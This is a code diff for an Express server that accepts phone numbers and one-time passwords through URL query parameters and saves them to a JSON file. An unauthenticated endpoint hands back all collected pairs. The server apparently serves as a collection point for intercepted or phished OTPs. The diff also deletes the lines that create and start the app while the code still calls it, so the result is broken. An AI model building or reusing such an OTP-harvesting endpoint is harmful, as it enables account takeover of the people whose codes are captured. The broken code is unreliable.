@@ -1,14 +1,6 @@
-const express = require('express');
-const path = require('path'); // To serve static files
-const app = express();
+const fs = require('fs');
+const otpDataFile = 'otpData.json';
 
-// Array to store phone numbers and OTPs
-const otpData = [];
-
-// Serve the static HTML page
-app.use(express.static(path.join(__dirname, 'public')));
-
-// Endpoint to receive phone and OTP
 app.get('/', (req, res) => {
     const phone = req.query.phone;
     const otp = req.query.otp;
@@ -20,8 +12,17 @@ app.get('/', (req, res) => {
         });
     }
 
-    // Store the phone and OTP in the array
+    // Load existing data from file
+    let otpData = [];
+    if (fs.existsSync(otpDataFile)) {
+        otpData = JSON.parse(fs.readFileSync(otpDataFile));
+    }
+
+    // Add new OTP
     otpData.push({ phone, otp });
+
+    // Save data back to file
+    fs.writeFileSync(otpDataFile, JSON.stringify(otpData, null, 2));
 
     res.status(200).json({
         message: `OTP ${otp} received for phone ${phone}`,
@@ -29,14 +30,9 @@ app.get('/', (req, res) => {
     });
 });
 
-// Endpoint to fetch all OTP data
 app.get('/fetch-otp-data', (req, res) => {
-    res.setHeader('Cache-Control', 'no-store'); // Disable caching
+    const otpData = fs.existsSync(otpDataFile)
+        ? JSON.parse(fs.readFileSync(otpDataFile))
+        : [];
     res.json(otpData);
-});
-
-// Start the server
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
 });
